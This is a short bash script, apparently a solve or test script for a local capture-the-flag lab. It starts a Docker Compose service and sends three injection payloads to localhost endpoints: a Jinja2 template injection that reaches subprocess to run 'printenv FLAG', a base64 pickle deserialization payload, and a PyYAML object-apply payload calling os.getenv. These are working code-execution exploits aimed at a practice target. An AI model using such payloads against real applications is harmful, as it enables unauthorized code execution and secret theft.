#!/bin/bash

docker compose up -d
sleep 5

# safe :)
# curl -v -H 'Content-Type: application/json' -d '{"input":""}' 'http://localhost:3000/eval'

curl -s -H 'Content-Type: application/json' -d $'{"input":"{{\'\'.__class__.__mro__[1].__subclasses__()[262]([\'printenv\',\'FLAG\'],stdout=-1).stdout.read()}}"}' 'http://localhost:3000/jinja2' | egrep -o 'flag{.*?}'
curl -s -H 'Content-Type: application/json' -d '{"base64_input":"gASVHAAAAAAAAACMAm9zlIwGZ2V0ZW52lJOUjARGTEFHlIWUUpQu"}' 'http://localhost:3000/pickle' | egrep -o 'flag{.*?}'
curl -s -H 'Content-Type: application/json' -d '{"input":"!!python/object/apply:os.getenv\n- FLAG"}' 'http://localhost:3000/yaml' | egrep -o 'flag{.*?}'

docker compose down
